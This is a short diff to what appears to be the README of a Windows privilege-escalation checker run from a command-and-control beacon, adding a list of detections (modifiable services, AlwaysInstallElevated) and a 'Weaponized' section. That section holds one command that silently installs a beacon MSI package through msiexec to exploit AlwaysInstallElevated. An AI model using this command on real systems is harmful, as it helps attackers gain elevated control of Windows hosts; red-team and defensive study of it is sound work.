@@ -31,3 +31,13 @@ Sample usage:
 >  StartMode        : Auto
 >
 >  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"
+
+Detects:
+  - Modifiable Service
+  - AlwaysInstallElevated flags in Registry
+  
+### Weaponized
+
+#### AlwaysInstallElevated - Install msi package file
+
+> beacon> run msiexec /i BeaconInstaller.msi /q /n
